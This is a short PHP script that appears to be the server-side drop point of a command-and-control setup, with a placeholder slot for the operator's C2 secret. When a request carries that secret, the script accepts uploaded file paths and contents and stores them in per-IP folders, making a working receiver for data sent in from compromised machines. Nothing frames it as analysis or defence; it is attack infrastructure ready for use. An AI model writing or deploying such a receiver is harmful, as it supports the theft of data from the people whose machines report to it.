<?php
    use Helzie\Http\Request;
    use Helzie\Http\Response;

    function GetAbsolutePath($path) {
        $path = str_replace(array("/", "\\"), DIRECTORY_SEPARATOR, $path);
        $parts = array_filter(explode(DIRECTORY_SEPARATOR, $path), "strlen");
        $absolutes = array();
        foreach ($parts as $part) {
            if ("." == $part) continue;
            if (".." == $part) {
                array_pop($absolutes);
            } else {
                $absolutes[] = $part;
            }
        }
        return implode(DIRECTORY_SEPARATOR, $absolutes);
    }

    if (Request::Parse("secret") === "<PUT_YOUR_C2_SECRET_HERE>") {
        $domain = sprintf("%s/chains/%s",
            $_SERVER["DOCUMENT_ROOT"],
            $_SERVER["REMOTE_ADDR"]);

        $fn = sprintf("%s/%s", $domain, GetAbsolutePath(Request::Parse("path", true)));
        if (is_file($fn)
                && file_get_contents($fn) !== Request::Parse("content", true))
            $fn = ("$fn-" . bin2hex(random_bytes(6)));

        @mkdir(dirname($fn), 0755, true);
        @file_put_contents($fn, Request::Parse("content", true));

        return Response::Throw(state: 200, body: [
            "result"    => "Accepted",
        ]);
    } else {
        return Response::Throw(state: 401, body: [
            "why"   => "Unauthorized",
        ]);
    }
?>
